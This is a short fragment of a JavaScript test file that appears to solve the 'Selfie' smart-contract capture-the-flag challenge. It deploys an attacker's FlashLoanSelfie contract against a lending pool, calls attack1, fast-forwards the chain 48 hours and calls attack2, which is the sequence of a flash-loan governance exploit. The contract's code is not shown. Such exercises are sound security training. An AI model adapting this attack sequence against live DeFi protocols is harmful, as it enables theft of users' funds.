...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    const FlashLoanSelfieFactory = await ethers.getContractFactory(
      "FlashLoanSelfie",
      attacker
    );

    this.flashLoanSelfie = await FlashLoanSelfieFactory.deploy(
      this.pool.address
    );

    await this.flashLoanSelfie.attack1();

    await network.provider.send("evm_increaseTime", [3600 * 48]);
    await network.provider.send("evm_mine");

    await this.flashLoanSelfie.attack2();
  });
